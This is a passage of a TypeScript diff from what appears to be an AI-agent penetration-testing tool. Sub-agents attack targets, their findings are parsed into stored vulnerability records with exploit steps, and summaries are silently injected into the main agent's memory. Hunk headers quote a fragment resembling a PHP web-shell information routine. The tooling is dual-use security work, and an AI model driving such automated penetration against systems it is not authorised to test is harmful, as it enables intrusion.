...\\n\\n<body>），同样禁止 \`\`\` 与任何修饰字符>\n若未确认漏洞，只需输出执行过程说明，不要输出【VULNDOC】）`
           const reply = await this.runViaGateway(task, sess, (abort) => { this.penetrateChildren.set(slot, abort) })  // 渗透经本地 gateway 执行（取消 = WebSocket abort，参考 hermes-studio chat-run）
           this.penetrateChildren.delete(slot)
           this.penetrateTargets.delete(slot)  // 渗透正常完成：清除目标记录（取消记录只由 cancel 路径写入全局情报）
@@ -2351,22 +2444,18 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
             this.analyzeSlots[slot] = ''  // 释放槽位会话：下次分析新建干净会话，子 Agent 继续流量分析
             this.pushSse({ type: 'penetrate-done', slot, reply, vulnDoc: false, skipped: true })
           } else {
-          // 解析 VULNDOC（兼容省略【VULNDOC】标记：检测"原始请求包："即视为漏洞文档正文）→ 写入漏洞库 + 静默注入主 Agent 会话记忆
-          const docBody = reply.includes('【VULNDOC】') ? (reply.match(/【VULNDOC】\s*\n([\s\S]*?)(?=\n【|$)/) || [])[1] ?? '' : /原始请求包[:：]/.test(reply) ? reply : ''
-          if (docBody) {
-            const g = (k: string) => (docBody.match(new RegExp(`${k}[:：]\\s*(.+)`)) || [])[1]?.trim() ?? ''
-            const level = g('危害等级').toLowerCase().includes('high') ? 'high' : g('危害等级').toLowerCase().includes('medium') || g('危害等级').toLowerCase().includes('中') ? 'medium' : g('危害等级').toLowerCase().includes('low') || g('危害等级').toLowerCase().includes('低') ? 'low' : 'info'
-            const uri = `${g('漏洞目标') || ''}${g('漏洞路由') || ''}`  // 目标+路由（完整定位，如 http://127.0.0.1:8800/api/login）
-            // 清洗：标题去掉开头路由前缀（如 "/api/login 未授权访问" → "未授权访问"——先 trim 再去前缀，防前导空格绕过）；原始报文去掉 ``` markdown 围栏
-            const rawName = (g('标题') || '子 Agent 渗透发现').trim().replace(/^https?:\/\/[^\s]+\s+/, '').replace(/^\/[^\s]+\s+/, '').trim()
-            const cleanRaw = (s: string) => s.split('\n').filter((l) => !l.trim().startsWith('```')).join('\n').trim()
+          // 解析 VULNDOC（core/vulndoc.ts 纯函数：兼容省略【VULNDOC】标记）→ 写入漏洞库 + 静默注入主 Agent 会话记忆
+          const parsed = parseVulndoc(reply, body.reqRaw || '', body.resRaw || '')
+          if (parsed) {
+            const level = parsed.level
+            const uri = parsed.uri
             // 复现步骤写入利用信息（exploit）；desc 只含漏洞描述 + 修复建议（不重复）
-            const v: Vuln = { id: ++this.vulnSeq, name: rawName || '子 Agent 渗透发现', level, cvss: '', uri, desc: `${g('漏洞描述')}\n\n修复建议：${g('修复建议')}`.slice(0, 2000), exploit: g('复现步骤'), status: 'pending', reqRaw: cleanRaw((docBody.match(/原始请求包[:：]\s*([\s\S]*?)(?=\n原始响应包[:：]|$)/) || [])[1]?.trim() || body.reqRaw || '').slice(0, 4000), resRaw: cleanRaw((docBody.match(/原始响应包[:：]\s*([\s\S]*?)$/) || [])[1]?.trim() || body.resRaw || '').slice(0, 4000), ts: Date.now() }
+            const v: Vuln = { id: ++this.vulnSeq, name: parsed.name, level, cvss: '', uri, desc: parsed.desc, exploit: parsed.exploit, status: 'pending', reqRaw: parsed.reqRaw, resRaw: parsed.resRaw, ts: Date.now() }
             this.vulns.push(v)
             this.saveVulns()
             // VULNDOC 成果入图（Agent 共享，host/path 从完整 uri 拆分）
             const { host: vh, path: vp } = this.splitVulnUri(uri)
-            if (vh && vp) { this.graph.writeVuln({ name: v.name, level, desc: v.desc, host: vh, path: vp, exploit: v.exploit, color: HAE_LEVEL_COLOR[level] }); this.graph.confirmAnalysis(vh, vp, level).catch(() => {}); this.broadcastGraphChange(`渗透确认漏洞(${level}) ${vh}${vp}: ${v.name}`) }
+            if (vh && vp) { this.graph.writeVuln({ name: v.name, level, desc: v.desc, host: vh, path: vp, exploit: v.exploit, color: HAE_LEVEL_COLOR[level] }).catch((e) => console.warn('[pentbox] 渗透成果入图失败:', String(e).slice(0, 100))); this.graph.confirmAnalysis(vh, vp, level).catch((e) => console.warn('[pentbox] 分析确认标记失败:', String(e).slice(0, 100))); this.broadcastGraphChange(`渗透确认漏洞(${level}) ${vh}${vp}: ${v.name}`) }
             // 渗透确认 → 对应流量条目标记 confirmed（前端轮询：疑似问号 → 确认 BUG ICON + 确认等级）
             if (typeof body.id === 'number') {
               const ast = this.analyzeMap.get(body.id)
@@ -2378,7 +2467,7 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
               // reqRaw 推导的规范 key（normalizeTargetKey 统一格式）优先记入——堵住 VULNDOC 漏洞路由不带 query 导致的 key 漂移
               if (targetKey) this.penetratedKeys.add(`${targetKey}|${pm}`)
               // 模型报告 uri 兜底（normalizeTargetKey 规范化，如 http://127.0.0.1:8800/api/login → 127.0.0.1:8800/api/login）
-              const normUri = this.normalizeTargetKey(uri)
+              const normUri = normalizeTargetKey(uri)
               if (normUri) this.penetratedKeys.add(`${normUri}|${pm}`)
               // 无 query 版本兜底（模型漏 query 时，同路径不同 query 仍视为已渗透）
               const uriNoQuery = normUri.split('?')[0]
@@ -2392,10 +2481,10 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
             this.pushSse({ type: 'vuln-doc', vuln: { id: v.id, name: v.name, level: v.level, desc: v.desc, exploit: v.exploit, ts: v.ts } })
             // 静默注入主 Agent 会话（走 Bridge 通道，与主会话同一命名空间才算真正注入；mainChat=false 不回写指针；仅当主会话已存在时注入）
             if (this.chatSessionId) {
-              this.bridgeAsk(`（记忆记录，无需回复与执行任何操作）已知漏洞档案：漏洞 ${v.id}：${v.name}（${level}）\n描述：${g('漏洞描述').slice(0, 300)}\n复现：${g('复现步骤').slice(0, 300)}`, this.chatSessionId, {}, false).catch(() => { /* 记忆注入失败不影响主流程 */ })
+              this.bridgeAsk(`（记忆记录，无需回复与执行任何操作）已知漏洞档案：漏洞 ${v.id}：${v.name}（${level}）\n描述：${parsed.desc.slice(0, 300)}\n复现：${parsed.exploit.slice(0, 300)}`, this.chatSessionId, {}, false).catch(() => { /* 记忆注入失败不影响主流程 */ })
             }
           }
-          this.pushSse({ type: 'penetrate-done', slot, reply, vulnDoc: !!docBody })  // 异步完成通知（前端更新任务/沟通窗口）
+          this.pushSse({ type: 'penetrate-done', slot, reply, vulnDoc: !!parsed })  // 异步完成通知（前端更新任务/沟通窗口）
           }
           } catch (e) {
             this.pushSse({ type: 'penetrate-done', slot, reply: `（渗透执行失败：${(e as Error).message}）`, vulnDoc: false })
@@ -2549,57 +2638,6 @@ function getBasicsInfo(){return "FileRoot:/ CurrentDir:/ OsInfo:php CurrentUser:
             this.json(res, 200, f)
             break
           }
-          if (url.pathname === '/api/upstream' && req.method === 'PUT') {
-            const body = JSON.parse(await this.readBody(req)) as Upstream
-            if (!body?.type) throw new Error('missing type')
-            this.engine.setUpstream(body)
-            this.json(res, 200, { ok: true, upstream: body })
-            break
-          }
-          // ---------------- 下游代理（类 Burp 方案：内置代理抓包/分析后转发给下游；独立于上游链） ----------------
-          if (url.pathname === '/api/downstream') {
-            if (req.method === 'PUT') {
-              const body = JSON.parse(await this.readBody(req)) as { host?: string; port?: number; protocol?: 'http' | 'socks5' }
-              const ds = body && body.host && body.port && Number(body.port) > 0
-                ? { host: String(body.host).trim(), port: Number(body.port), protocol: body.protocol === 'socks5' ? ('socks5' as const) : ('http' as const) }
-                : null
-              this.engine.setDownstream(ds)
-              try { writeFileSync(this.dsFile, JSON.stringify(ds ? { host: ds.host, port: ds.port, protocol: ds.protocol } : {})) } catch { /* 落盘失败不影响运行 */ }
-              this.json(res, 200, { ok: true, downstream: ds })
-            } else {
-              this.json(res, 200, { downstream: this.engine.getDownstream() })
-            }
-            break
-          }
-          // ---------------- 监听设置（监听地址 + 主服务端口，重启生效；代理/终端端口固定默认） ----------------
-          if (url.pathname === '/api/listen') {
-            if (req.method === 'PUT') {
-              const body = JSON.parse(await this.readBody(req)) as { ip?: string; api?: number }
-              const ip = String(body?.ip ?? '').trim()
-              const options = ApiServer.listenOptions()
-              if (!(ip === '0.0.0.0' || ip === '127.0.0.1' || options.includes(ip))) throw new Error(`invalid listen ip: ${ip}`)
-              const api = body?.api ? Number(body.api) : this.opts.port ?? this.port
-              if (!Number.isInteger(api) || api < 1 || api > 65535) throw new Error(`端口 ${body?.api} 不在合理范围（1-65535）`)
-              if (api === 8899 || api === 8878) throw new Error(`端口 ${api} 与代理/终端默认端口冲突`)
-              // 占用检查：排除当前正在使用的 API 端口，其余须未被占用
-              if (api !== (this.opts.port ?? this.port) && await ApiServer.portInUse(api)) throw new Error(`端口 ${api} 已被占用`)
-              try {
-                const { writeFileSync, mkdirSync } = require('node:fs') as typeof import('node:fs')
-                const { dirname } = require('node:path') as typeof import('node:path')
-                if (ApiServer.LISTEN_FILE) { mkdirSync(dirname(ApiServer.LISTEN_FILE), { recursive: true }); writeFileSync(ApiServer.LISTEN_FILE, JSON.stringify({ ip, api })) }
-              } catch { /* 落盘失败不影响返回 */ }
-              this.json(res, 200, { ok: true, ip, api, restart: true })
-            } else {
-              this.json(res, 200, { ...ApiServer.loadListen(), options: ApiServer.listenOptions() })
-            }
-            break
-          }
-          if (url.pathname === '/api/proxy/stop' && req.method === 'POST') {
-            await this.engine.stop()
-            this.json(res, 200, { ok: true })
-            break
-          }
-          this.json(res, 404, { error: `no route: ${req.method} ${url.pathname}` })
       }
     } catch (e) {
       this.json(res, 400, { error: e instanceof Error ? e.message : String(e) })
